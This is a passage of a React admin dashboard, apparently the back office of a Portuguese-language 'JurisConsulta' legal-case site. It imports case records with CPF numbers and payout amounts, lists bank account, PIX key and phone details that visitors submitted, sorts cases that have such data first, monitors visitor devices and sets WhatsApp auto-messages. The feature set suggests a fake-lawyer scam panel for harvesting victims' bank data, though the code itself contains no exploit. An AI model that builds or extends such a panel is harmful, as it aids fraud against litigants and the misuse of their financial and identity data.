import { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import {
  Scale, Plus, Pencil, Trash2, X, Save, FileText, DollarSign, Search,
  ChevronDown, Landmark, Phone, CreditCard, Eye, Building2, KeyRound,
  Gavel, User, Clock, CheckCircle, LogOut, Calendar, TrendingUp,
  Users, Bell, RefreshCw, Upload, AlertCircle, Globe, Monitor, Smartphone,
  ArrowUpDown, Database, Activity, Settings, MessageSquare
} from 'lucide-react'

function formatCPFInput(value) {
  const digits = value.replace(/\D/g, '').slice(0, 11)
  if (digits.length <= 3) return digits
  if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`
  if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`
  return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`
}

function formatCurrency(value) {
  return new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(value)
}

function parseCurrency(value) {
  return parseFloat(value.replace(/[^\d,]/g, '').replace(',', '.')) || 0
}

function formatCurrencyInput(value) {
  const clean = value.replace(/[^\d]/g, '')
  if (!clean) return ''
  const num = parseInt(clean) / 100
  return num.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
}

function formatDate(dateStr) {
  if (!dateStr) return '-'
  const d = new Date(dateStr)
  return d.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' })
}

function formatDateShort(dateStr) {
  if (!dateStr) return '-'
  const d = new Date(dateStr)
  return d.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' })
}

function timeAgo(dateStr) {
  if (!dateStr) return ''
  const d = new Date(dateStr)
  const now = new Date()
  const diff = Math.floor((now - d) / 1000)

  if (diff < 60) return 'agora mesmo'
  if (diff < 3600) return `há ${Math.floor(diff / 60)} min`
  if (diff < 86400) return `há ${Math.floor(diff / 3600)}h`
  if (diff < 172800) return 'ontem'
  return `há ${Math.floor(diff / 86400)} dias`
}

function normalizeCPF(cpf) {
  return cpf?.replace(/\D/g, '') || ''
}

const EMPTY_FORM = {
  nome: '', cpf: '', numero_processo: '', advogado: '',
  valor_receber: '', valor_pendente: '', status: 'Em andamento',
  polo_ativo: '', polo_passivo: '', vara: '', comarca: '', classe: '', assunto: '',
}

const STATUS_OPTIONS = ['Em andamento', 'Concluído', 'Pendente', 'Aguardando']

function statusConfig(status) {
  const map = {
    'Em andamento': { bg: 'bg-amber-500/10', text: 'text-amber-600', border: 'border-amber-500/20', dot: 'bg-amber-500' },
    'Concluído': { bg: 'bg-emerald-500/10', text: 'text-emerald-600', border: 'border-emerald-500/20', dot: 'bg-emerald-500' },
    'Pendente': { bg: 'bg-red-500/10', text: 'text-red-600', border: 'border-red-500/20', dot: 'bg-red-500' },
    'Aguardando': { bg: 'bg-blue-500/10', text: 'text-blue-600', border: 'border-blue-500/20', dot: 'bg-blue-500' },
  }
  return map[status] || { bg: 'bg-gray-500/10', text: 'text-gray-600', border: 'border-gray-500/20', dot: 'bg-gray-500' }
}

export default function AdminPage() {
  const navigate = useNavigate()
  const [processos, setProcessos] = useState([])
  const [prosseguimentos, setProsseguimentos] = useState([])
  const [acessos, setAcessos] = useState([])
  const [acessosStats, setAcessosStats] = useState({ total: 0, hoje: 0, dispositivos: [] })
  const [showModal, setShowModal] = useState(false)
  const [showDetailModal, setShowDetailModal] = useState(null)
  const [editing, setEditing] = useState(null)
  const [form, setForm] = useState(EMPTY_FORM)
  const [searchTerm, setSearchTerm] = useState('')
  const [searchInput, setSearchInput] = useState('')
  const [saving, setSaving] = useState(false)
  const [deleteConfirm, setDeleteConfirm] = useState(null)
  const [deleteDadoConfirm, setDeleteDadoConfirm] = useState(null)
  const [refreshing, setRefreshing] = useState(false)
  const [showImportModal, setShowImportModal] = useState(false)
  const [importResult, setImportResult] = useState(null)
  const [importing, setImporting] = useState(false)
  const [page, setPage] = useState(1)
  const [pagination, setPagination] = useState({ total: 0, totalPages: 1 })
  const [activeTab, setActiveTab] = useState('processos')
  const [orderBy, setOrderBy] = useState('dados_primeiro')
  const [acessosPage, setAcessosPage] = useState(1)
  const [acessosPagination, setAcessosPagination] = useState({ total: 0, totalPages: 1 })
  const [config, setConfig] = useState({ whatsapp_numero: '', whatsapp_mensagem: '' })
  const [savingConfig, setSavingConfig] = useState(false)
  const LIMIT = 50
  const [isLoading, setIsLoading] = useState(true)

  // Load initial data
  useEffect(() => {
    loadProsseguimentos()
  }, [])

  // Load data based on active tab
  useEffect(() => {
    if (activeTab === 'processos') {
      loadProcessos()
    } else if (activeTab === 'acessos') {
      loadAcessos()
      loadAcessosStats()
    } else if (activeTab === 'configuracoes') {
      loadConfig()
    }
  }, [activeTab])

  // Reload processos when filters change
  useEffect(() => {
    if (activeTab === 'processos') {
      loadProcessos()
    }
  }, [page, searchTerm, orderBy])

  // Reload acessos when page changes
  useEffect(() => {
    if (activeTab === 'acessos') {
      loadAcessos()
    }
  }, [acessosPage])

  async function loadAll() {
    setRefreshing(true)
    try {
      await Promise.all([
        loadProcessos(),
        loadProsseguimentos(),
        loadAcessos(),
        loadAcessosStats()
      ])
    } finally {
      setRefreshing(false)
    }
  }

  async function loadProcessos(filterDados = '') {
    setIsLoading(true)
    try {
      const params = new URLSearchParams({ page: String(page), limit: String(LIMIT), orderBy })
      if (searchTerm) params.append('search', searchTerm)
      if (filterDados) params.append('filterDados', filterDados)
      const res = await fetch(`/api/processos?${params}`)
      if (res.ok) {
        const result = await res.json()
        setProcessos(result.data || [])
        setPagination(result.pagination || { total: 0, totalPages: 1 })
      }
    } catch (err) {
      console.error('Erro ao carregar processos:', err)
    } finally {
      setIsLoading(false)
      setRefreshing(false)
    }
  }

  async function loadProsseguimentos() {
    try {
      const res = await fetch('/api/prosseguimentos')
      const data = await res.json()
      setProsseguimentos(data)
    } catch {
      console.error('Erro ao carregar prosseguimentos')
    }
  }

  async function loadAcessos() {
    try {
      const res = await fetch(`/api/acessos?page=${acessosPage}&limit=${LIMIT}`)
      const result = await res.json()
      setAcessos(result.data || [])
      setAcessosPagination(result.pagination || { total: 0, totalPages: 1 })
    } catch {
      console.error('Erro ao carregar acessos')
    }
  }

  async function loadAcessosStats() {
    try {
      const res = await fetch('/api/acessos/stats')
      const data = await res.json()
      setAcessosStats(data)
    } catch {
      console.error('Erro ao carregar estatísticas')
    }
  }

  async function loadConfig() {
    try {
      const res = await fetch('/api/configuracoes')
      const data = await res.json()
      setConfig(data)
    } catch {
      console.error('Erro ao carregar configurações')
    }
  }

  async function saveConfig() {
    setSavingConfig(true)
    try {
      await fetch('/api/configuracoes', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(config)
      })
    } catch {
      console.error('Erro ao salvar configurações')
    } finally {
      setSavingConfig(false)
    }
  }

  function getProsseguimentosByProcesso(processo) {
    const cpfNorm = normalizeCPF(processo.cpf)
    return prosseguimentos.filter(p => normalizeCPF(p.cpf) === cpfNorm || normalizeCPF(p.cpf_titular) === cpfNorm)
  }

  function handleLogout() {
    localStorage.removeItem('admin_auth')
    navigate(0)
  }

  function openNew() {
    setForm(EMPTY_FORM)
    setEditing(null)
    setShowModal(true)
  }

  function openEdit(processo, e) {
    e?.stopPropagation()
    setForm({
      nome: processo.nome,
      cpf: processo.cpf,
      numero_processo: processo.numero_processo,
      advogado: processo.advogado,
      valor_receber: processo.valor_receber.toLocaleString('pt-BR', { minimumFractionDigits: 2 }),
      valor_pendente: processo.valor_pendente.toLocaleString('pt-BR', { minimumFractionDigits: 2 }),
      status: processo.status,
      polo_ativo: processo.polo_ativo || '',
      polo_passivo: processo.polo_passivo || '',
      vara: processo.vara || '',
      comarca: processo.comarca || '',
      classe: processo.classe || '',
      assunto: processo.assunto || '',
    })
    setEditing(processo.id)
    setShowModal(true)
  }

  async function handleSave(e) {
    e.preventDefault()
    setSaving(true)
    const payload = {
      ...form,
      valor_receber: parseCurrency(form.valor_receber),
      valor_pendente: parseCurrency(form.valor_pendente),
    }
    try {
      if (editing) {
        await fetch(`/api/processos/${editing}`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        })
      } else {
        await fetch('/api/processos', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        })
      }
      setShowModal(false)
      loadProcessos()
    } catch {
      alert('Erro ao salvar')
    } finally {
      setSaving(false)
    }
  }

  async function handleDelete(id, e) {
    e?.stopPropagation()
    try {
      await fetch(`/api/processos/${id}`, { method: 'DELETE' })
      setDeleteConfirm(null)
      loadProcessos()
    } catch {
      alert('Erro ao excluir')
    }
  }

  async function handleDeleteDado(dadoId) {
    try {
      await fetch(`/api/prosseguimentos/${dadoId}`, { method: 'DELETE' })
      setDeleteDadoConfirm(null)
      await loadProsseguimentos()
      if (showDetailModal) {
        const updatedDados = showDetailModal.dados.filter(d => d.id !== dadoId)
        setShowDetailModal({ ...showDetailModal, dados: updatedDados })
      }
    } catch {
      alert('Erro ao excluir dados bancários')
    }
  }

  async function handleImportJSON(e) {
    const file = e.target.files?.[0]
    if (!file) return

    if (!file.name.endsWith('.json')) {
      setImportResult({ error: 'Por favor, selecione um arquivo .json' })
      e.target.value = ''
      return
    }

    setImporting(true)
    setImportResult(null)

    try {
      let text = await file.text()

      // Remover BOM se existir
      text = text.replace(/^﻿/, '').trim()

      // Validar se é JSON válido
      let processos
      try {
        processos = JSON.parse(text)
      } catch (parseErr) {
        const preview = text.slice(0, 50).trim()
        throw new Error(`JSON inválido. Início do arquivo: "${preview}..."`)
      }

      // Garantir que é um array
      const lista = Array.isArray(processos) ? processos : [processos]

      if (lista.length === 0) {
        throw new Error('O arquivo não contém processos.')
      }

      const res = await fetch('/api/importar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ processos: lista })
      })

      if (!res.ok) {
        throw new Error('Erro no servidor: ' + res.status)
      }

      const result = await res.json()
      setImportResult(result)
      if (result.success) {
        loadProcessos()
      }
    } catch (err) {
      setImportResult({ error: err.message })
    } finally {
      setImporting(false)
      e.target.value = ''
    }
  }

  function handleSearch(e) {
    e.preventDefault()
    setPage(1)
    setSearchTerm(searchInput)
  }

  function clearSearch() {
    setSearchInput('')
    setSearchTerm('')
    setPage(1)
  }

  const totalReceber = processos.reduce((s, p) => s + (p.valor_receber || 0), 0)
  const totalPendente = processos.reduce((s, p) => s + (p.valor_pendente || 0), 0)
  const totalComDados = prosseguimentos.length

  return (
    <div className="min-h-screen bg-[#0f172a]">
      {/* Sidebar */}
      <aside className="fixed left-0 top-0 bottom-0 w-64 bg-[#1e293b] border-r border-white/5 flex flex-col z-20">
        {/* Logo */}
        <div className="p-6 border-b border-white/5">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-gradient-to-br from-[#2364af] to-[#1a4f8f] rounded-xl flex items-center justify-center shadow-lg shadow-[#2364af]/20">
              <Scale className="w-5 h-5 text-white" />
            </div>
            <div>
              <h1 className="text-base font-bold text-white leading-tight">JurisConsulta</h1>
              <p className="text-[10px] text-gray-500 font-medium uppercase tracking-wider">Painel Admin</p>
            </div>
          </div>
        </div>

        {/* Nav */}
        <nav className="flex-1 p-4">
          <div className="space-y-1">
            <button
              onClick={() => { setActiveTab('processos'); setPage(1); }}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl font-medium text-sm transition-colors ${
                activeTab === 'processos' ? 'bg-[#2364af]/10 text-[#2364af]' : 'text-gray-400 hover:text-white hover:bg-white/5'
              }`}
            >
              <FileText className="w-4 h-4" />
              <span>Processos</span>
              <span className={`ml-auto text-xs px-2 py-0.5 rounded-full ${activeTab === 'processos' ? 'bg-[#2364af] text-white' : 'bg-gray-700 text-gray-300'}`}>
                {pagination.total.toLocaleString()}
              </span>
            </button>
            <button
              onClick={() => { setActiveTab('dados_enviados'); setPage(1); }}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl font-medium text-sm transition-colors ${
                activeTab === 'dados_enviados' ? 'bg-emerald-500/10 text-emerald-400' : 'text-gray-400 hover:text-white hover:bg-white/5'
              }`}
            >
              <Database className="w-4 h-4" />
              <span>Dados Enviados</span>
              <span className={`ml-auto text-xs px-2 py-0.5 rounded-full ${activeTab === 'dados_enviados' ? 'bg-emerald-500 text-white' : 'bg-gray-700 text-gray-300'}`}>
                {prosseguimentos.length}
              </span>
            </button>
            <button
              onClick={() => { setActiveTab('acessos'); setAcessosPage(1); }}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl font-medium text-sm transition-colors ${
                activeTab === 'acessos' ? 'bg-violet-500/10 text-violet-400' : 'text-gray-400 hover:text-white hover:bg-white/5'
              }`}
            >
              <Activity className="w-4 h-4" />
              <span>Acessos</span>
              <span className={`ml-auto text-xs px-2 py-0.5 rounded-full ${activeTab === 'acessos' ? 'bg-violet-500 text-white' : 'bg-gray-700 text-gray-300'}`}>
                {acessosStats.total.toLocaleString()}
              </span>
            </button>
            <button
              onClick={() => { setActiveTab('configuracoes'); }}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl font-medium text-sm transition-colors ${
                activeTab === 'configuracoes' ? 'bg-amber-500/10 text-amber-400' : 'text-gray-400 hover:text-white hover:bg-white/5'
              }`}
            >
              <Settings className="w-4 h-4" />
              <span>Configurações</span>
            </button>
          </div>
        </nav>

        {/* User area */}
        <div className="p-4 border-t border-white/5">
          <button
            onClick={handleLogout}
            className="w-full flex items-center gap-3 px-4 py-3 rounded-xl text-gray-400 hover:text-white hover:bg-white/5 transition-all text-sm cursor-pointer"
          >
            <LogOut className="w-4 h-4" />
            <span>Sair do sistema</span>
          </button>
        </div>
      </aside>

      {/* Main content */}
      <main className="ml-64 min-h-screen">
        {/* Top bar */}
        <header className="sticky top-0 z-10 bg-[#0f172a]/80 backdrop-blur-xl border-b border-white/5 px-8 py-4">
          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-xl font-bold text-white">
                {activeTab === 'processos' && 'Processos'}
                {activeTab === 'dados_enviados' && 'Dados Enviados'}
                {activeTab === 'acessos' && 'Acessos'}
                {activeTab === 'configuracoes' && 'Configurações'}
              </h2>
              <p className="text-sm text-gray-500">
                {activeTab === 'processos' && 'Gerencie todos os processos cadastrados'}
                {activeTab === 'dados_enviados' && 'Clientes que enviaram dados bancários'}
                {activeTab === 'acessos' && 'Monitoramento de acessos ao sistema'}
                {activeTab === 'configuracoes' && 'Configure WhatsApp e mensagens automáticas'}
              </p>
            </div>
            <div className="flex items-center gap-3">
              <button
                onClick={loadAll}
                disabled={refreshing}
                className="p-2.5 text-gray-400 hover:text-white hover:bg-white/5 rounded-xl transition-all cursor-pointer disabled:opacity-50"
                title="Atualizar"
              >
                <RefreshCw className={`w-5 h-5 ${refreshing ? 'animate-spin' : ''}`} />
              </button>
              <label className="bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 text-white px-5 py-2.5 rounded-xl text-sm font-semibold flex items-center gap-2 transition-all shadow-lg shadow-emerald-500/20 cursor-pointer">
                <Upload className="w-4 h-4" />
                Importar JSON
                <input type="file" accept=".json" onChange={handleImportJSON} className="hidden" />
              </label>
              <button
                onClick={openNew}
                className="bg-gradient-to-r from-[#2364af] to-[#1a4f8f] hover:from-[#1a4f8f] hover:to-[#143d6e] text-white px-5 py-2.5 rounded-xl text-sm font-semibold flex items-center gap-2 transition-all shadow-lg shadow-[#2364af]/20 cursor-pointer"
              >
                <Plus className="w-4 h-4" />
                Novo Processo
              </button>
            </div>
          </div>
        </header>

        <div className="p-8">
          {/* CONTEÚDO DA ABA PROCESSOS */}
          {activeTab === 'processos' && (
            <>
              {/* Stats */}
              <div className="grid grid-cols-4 gap-4 mb-8">
                {[
                  { label: 'Total', value: pagination.total.toLocaleString('pt-BR'), icon: FileText, color: '#2364af' },
                  { label: 'Com Dados', value: prosseguimentos.length, icon: Database, color: '#10b981' },
                  { label: 'Página', value: `${page}/${pagination.totalPages || 1}`, icon: FileText, color: '#8b5cf6' },
                  { label: 'Exibindo', value: processos.length, icon: TrendingUp, color: '#f59e0b' },
                ].map((stat, i) => (
                  <div key={i} className="bg-[#1e293b] rounded-2xl border border-white/5 p-5">
                    <div className="flex items-center gap-3 mb-2">
                      <stat.icon className="w-5 h-5" style={{ color: stat.color }} />
                      <p className="text-xs text-gray-500">{stat.label}</p>
                    </div>
                    <p className="text-2xl font-bold text-white">{stat.value}</p>
                  </div>
                ))}
              </div>

              {/* Search e Filtros */}
              <div className="mb-6 flex flex-wrap gap-4 items-end">
                <form onSubmit={handleSearch} className="flex gap-2 flex-1 min-w-[300px]">
              <div className="relative flex-1">
                <Search className="w-4 h-4 text-gray-500 absolute left-4 top-1/2 -translate-y-1/2" />
                <input
                  type="text"
                  placeholder="Buscar por nome, CPF ou processo..."
                  value={searchInput}
                  onChange={e => setSearchInput(e.target.value)}
                  className="w-full pl-11 pr-4 py-3 bg-[#1e293b] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] focus:ring-2 focus:ring-[#2364af]/20 transition-all text-sm"
                />
              </div>
              <button type="submit" className="px-5 py-3 bg-[#2364af] hover:bg-[#1a4f8f] text-white rounded-xl text-sm font-semibold transition-colors">
                Buscar
              </button>
              {searchTerm && (
                <button type="button" onClick={clearSearch} className="px-4 py-3 bg-gray-700 hover:bg-gray-600 text-white rounded-xl text-sm transition-colors">
                  Limpar
                </button>
              )}
            </form>

            {/* Ordenação */}
            <div className="flex items-center gap-2">
              <ArrowUpDown className="w-4 h-4 text-gray-500" />
              <select
                value={orderBy}
                onChange={(e) => { setOrderBy(e.target.value); setPage(1); }}
                className="bg-[#1e293b] border border-white/10 rounded-xl text-white px-4 py-3 text-sm appearance-none cursor-pointer min-w-[180px]"
              >
                <option value="dados_primeiro">Com dados primeiro</option>
                <option value="recente">Mais recentes</option>
                <option value="antigo">Mais antigos</option>
                <option value="nome_az">Nome A-Z</option>
                <option value="nome_za">Nome Z-A</option>
                <option value="valor_maior">Maior valor</option>
                <option value="valor_menor">Menor valor</option>
              </select>
            </div>
          </div>

          {searchTerm && (
            <p className="text-gray-500 text-xs mb-4">
              Resultados para: <span className="text-white">"{searchTerm}"</span> ({pagination.total} encontrados)
            </p>
          )}

          {/* Table */}
          <div className="bg-[#1e293b] rounded-2xl border border-white/5 overflow-hidden">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-white/5">
                  <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Cliente</th>
                  <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Processo</th>
                  <th className="text-right px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Valor</th>
                  <th className="text-center px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Status</th>
                  <th className="text-center px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Dados Bancários</th>
                  <th className="text-center px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider w-28">Ações</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-white/5">
                {isLoading && processos.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="px-6 py-20 text-center">
                      <div className="w-8 h-8 border-3 border-[#2364af]/30 border-t-[#2364af] rounded-full animate-spin mx-auto mb-4" />
                      <p className="text-gray-400 font-medium">Carregando processos...</p>
                    </td>
                  </tr>
                ) : processos.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="px-6 py-20 text-center">
                      <FileText className="w-12 h-12 text-gray-700 mx-auto mb-4" />
                      <p className="text-gray-400 font-medium mb-1">Nenhum processo encontrado</p>
                      <p className="text-gray-600 text-xs">Clique em "Novo Processo" para cadastrar</p>
                    </td>
                  </tr>
                ) : processos.map(p => {
                  const dadosBancarios = getProsseguimentosByProcesso(p)
                  const temDados = dadosBancarios.length > 0
                  const ultimoEnvio = temDados ? dadosBancarios[0].criado_em : null
                  const sc = statusConfig(p.status)

                  return (
                    <tr
                      key={p.id}
                      onClick={() => setShowDetailModal({ processo: p, dados: dadosBancarios })}
                      className="hover:bg-white/[0.02] transition-colors cursor-pointer group"
                    >
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-3">
                          <div className="w-10 h-10 bg-gradient-to-br from-[#2364af]/20 to-[#1a4f8f]/20 rounded-full flex items-center justify-center">
                            <span className="text-sm font-bold text-[#2364af]">{p.nome.charAt(0).toUpperCase()}</span>
                          </div>
                          <div>
                            <p className="font-semibold text-white group-hover:text-[#2364af] transition-colors">{p.nome}</p>
                            <p className="text-xs text-gray-500 font-mono">{p.cpf}</p>
                          </div>
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <p className="text-gray-300 font-mono text-xs">{p.numero_processo}</p>
                        <p className="text-xs text-gray-600 mt-0.5">{p.advogado}</p>
                      </td>
                      <td className="px-6 py-4 text-right">
                        <p className="font-bold text-emerald-400">{formatCurrency(p.valor_receber)}</p>
                        {p.valor_pendente > 0 && (
                          <p className="text-xs text-amber-500 mt-0.5">{formatCurrency(p.valor_pendente)} pendente</p>
                        )}
                      </td>
                      <td className="px-6 py-4 text-center">
                        <span className={`inline-flex items-center gap-1.5 text-xs font-semibold px-3 py-1.5 rounded-lg ${sc.bg} ${sc.text}`}>
                          <span className={`w-1.5 h-1.5 rounded-full ${sc.dot}`} />
                          {p.status}
                        </span>
                      </td>
                      <td className="px-6 py-4 text-center">
                        {temDados ? (
                          <div className="inline-flex flex-col items-center">
                            <span className="inline-flex items-center gap-1.5 text-xs font-semibold px-3 py-1.5 rounded-lg bg-emerald-500/10 text-emerald-400">
                              <CheckCircle className="w-3.5 h-3.5" />
                              {dadosBancarios.length} {dadosBancarios.length === 1 ? 'envio' : 'envios'}
                            </span>
                            <span className="text-[10px] text-gray-600 mt-1">{timeAgo(ultimoEnvio)}</span>
                          </div>
                        ) : (
                          <span className="text-xs text-gray-600">Aguardando</span>
                        )}
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex items-center justify-center gap-1">
                          <button
                            onClick={(e) => { e.stopPropagation(); setShowDetailModal({ processo: p, dados: dadosBancarios }) }}
                            className="p-2 text-gray-500 hover:text-[#2364af] hover:bg-[#2364af]/10 rounded-lg transition-all cursor-pointer"
                            title="Ver detalhes"
                          >
                            <Eye className="w-4 h-4" />
                          </button>
                          <button
                            onClick={(e) => openEdit(p, e)}
                            className="p-2 text-gray-500 hover:text-[#2364af] hover:bg-[#2364af]/10 rounded-lg transition-all cursor-pointer"
                            title="Editar"
                          >
                            <Pencil className="w-4 h-4" />
                          </button>
                          {deleteConfirm === p.id ? (
                            <div className="flex items-center gap-1">
                              <button onClick={(e) => handleDelete(p.id, e)} className="px-2 py-1 bg-red-500 text-white text-xs rounded-lg hover:bg-red-600 cursor-pointer">Sim</button>
                              <button onClick={(e) => { e.stopPropagation(); setDeleteConfirm(null) }} className="px-2 py-1 bg-gray-700 text-gray-300 text-xs rounded-lg hover:bg-gray-600 cursor-pointer">Não</button>
                            </div>
                          ) : (
                            <button
                              onClick={(e) => { e.stopPropagation(); setDeleteConfirm(p.id) }}
                              className="p-2 text-gray-500 hover:text-red-400 hover:bg-red-500/10 rounded-lg transition-all cursor-pointer"
                              title="Excluir"
                            >
                              <Trash2 className="w-4 h-4" />
                            </button>
                          )}
                        </div>
                      </td>
                    </tr>
                  )
                })}
              </tbody>
            </table>

            {/* Paginação */}
            {pagination.totalPages > 1 && (
              <div className="flex items-center justify-between px-6 py-4 border-t border-white/5">
                <p className="text-sm text-gray-500">
                  Mostrando <span className="text-white font-medium">{((page - 1) * LIMIT) + 1}</span> a{' '}
                  <span className="text-white font-medium">{Math.min(page * LIMIT, pagination.total)}</span> de{' '}
                  <span className="text-white font-medium">{pagination.total}</span> processos
                </p>
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => setPage(1)}
                    disabled={page === 1}
                    className="px-3 py-2 rounded-lg text-sm font-medium disabled:opacity-30 disabled:cursor-not-allowed text-gray-400 hover:bg-white/5 hover:text-white transition-colors"
                  >
                    Primeira
                  </button>
                  <button
                    onClick={() => setPage(p => Math.max(1, p - 1))}
                    disabled={page === 1}
                    className="px-3 py-2 rounded-lg text-sm font-medium disabled:opacity-30 disabled:cursor-not-allowed text-gray-400 hover:bg-white/5 hover:text-white transition-colors"
                  >
                    Anterior
                  </button>
                  <div className="flex items-center gap-1 px-2">
                    {Array.from({ length: Math.min(5, pagination.totalPages) }, (_, i) => {
                      let pageNum;
                      if (pagination.totalPages <= 5) {
                        pageNum = i + 1;
                      } else if (page <= 3) {
                        pageNum = i + 1;
                      } else if (page >= pagination.totalPages - 2) {
                        pageNum = pagination.totalPages - 4 + i;
                      } else {
                        pageNum = page - 2 + i;
                      }
                      return (
                        <button
                          key={pageNum}
                          onClick={() => setPage(pageNum)}
                          className={`w-9 h-9 rounded-lg text-sm font-medium transition-colors ${
                            page === pageNum
                              ? 'bg-[#2364af] text-white'
                              : 'text-gray-400 hover:bg-white/5 hover:text-white'
                          }`}
                        >
                          {pageNum}
                        </button>
                      );
                    })}
                  </div>
                  <button
                    onClick={() => setPage(p => Math.min(pagination.totalPages, p + 1))}
                    disabled={page === pagination.totalPages}
                    className="px-3 py-2 rounded-lg text-sm font-medium disabled:opacity-30 disabled:cursor-not-allowed text-gray-400 hover:bg-white/5 hover:text-white transition-colors"
                  >
                    Próxima
                  </button>
                  <button
                    onClick={() => setPage(pagination.totalPages)}
                    disabled={page === pagination.totalPages}
                    className="px-3 py-2 rounded-lg text-sm font-medium disabled:opacity-30 disabled:cursor-not-allowed text-gray-400 hover:bg-white/5 hover:text-white transition-colors"
                  >
                    Última
                  </button>
                </div>
              </div>
            )}
          </div>
            </>
          )}

          {/* CONTEÚDO DA ABA DADOS ENVIADOS */}
          {activeTab === 'dados_enviados' && (
            <>
              {/* Stats */}
              <div className="grid grid-cols-3 gap-4 mb-8">
                <div className="bg-[#1e293b] rounded-2xl border border-white/5 p-5">
                  <div className="flex items-center gap-3 mb-2">
                    <Database className="w-5 h-5 text-emerald-500" />
                    <p className="text-xs text-gray-500">Total de Envios</p>
                  </div>
                  <p className="text-2xl font-bold text-white">{prosseguimentos.length}</p>
                </div>
                <div className="bg-[#1e293b] rounded-2xl border border-white/5 p-5">
                  <div className="flex items-center gap-3 mb-2">
                    <Calendar className="w-5 h-5 text-violet-500" />
                    <p className="text-xs text-gray-500">Hoje</p>
                  </div>
                  <p className="text-2xl font-bold text-white">
                    {prosseguimentos.filter(p => new Date(p.criado_em).toDateString() === new Date().toDateString()).length}
                  </p>
                </div>
                <div className="bg-[#1e293b] rounded-2xl border border-white/5 p-5">
                  <div className="flex items-center gap-3 mb-2">
                    <Landmark className="w-5 h-5 text-amber-500" />
                    <p className="text-xs text-gray-500">Bancos Diferentes</p>
                  </div>
                  <p className="text-2xl font-bold text-white">
                    {new Set(prosseguimentos.map(p => p.banco)).size}
                  </p>
                </div>
              </div>

              {/* Tabela de Prosseguimentos */}
              <div className="bg-[#1e293b] rounded-2xl border border-white/5 overflow-hidden">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="border-b border-white/5">
                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Data</th>
                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Titular</th>
                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">CPF</th>
                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Telefone</th>
                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Banco</th>
                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Agência/Conta</th>
                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">PIX</th>
                      <th className="text-center px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider w-20">Ações</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-white/5">
                    {prosseguimentos.length === 0 ? (
                      <tr>
                        <td colSpan={8} className="px-6 py-20 text-center">
                          <Database className="w-12 h-12 text-gray-700 mx-auto mb-4" />
                          <p className="text-gray-400 font-medium mb-1">Nenhum dado bancário enviado</p>
                          <p className="text-gray-600 text-xs">Os dados aparecerão aqui quando clientes preencherem</p>
                        </td>
                      </tr>
                    ) : prosseguimentos.map(p => (
                      <tr key={p.id} className="hover:bg-white/5 transition-colors">
                        <td className="px-6 py-4">
                          <div className="flex items-center gap-2">
                            <Clock className="w-4 h-4 text-gray-500" />
                            <span className="text-white text-sm">{formatDate(p.criado_em)}</span>
                          </div>
                        </td>
                        <td className="px-6 py-4">
                          <p className="text-white font-medium">{p.titular || '-'}</p>
                        </td>
                        <td className="px-6 py-4">
                          <span className="text-gray-300 font-mono text-sm">{p.cpf_titular || p.cpf}</span>
                        </td>
                        <td className="px-6 py-4">
                          <div className="flex items-center gap-2">
                            <Phone className="w-4 h-4 text-emerald-500" />
                            <span className="text-gray-300">{p.telefone}</span>
                          </div>
                        </td>
                        <td className="px-6 py-4">
                          <span className="text-gray-300">{p.banco}</span>
                        </td>
                        <td className="px-6 py-4">
                          <div className="text-gray-300">
                            <span className="text-xs text-gray-500">Ag:</span> {p.agencia}{' '}
                            <span className="text-xs text-gray-500">Cc:</span> {p.conta}
                            <span className="text-xs text-gray-500 ml-1">({p.tipo_conta})</span>
                          </div>
                        </td>
                        <td className="px-6 py-4">
                          <span className="text-gray-300 font-mono text-sm">{p.chave_pix || '-'}</span>
                        </td>
                        <td className="px-6 py-4">
                          <button
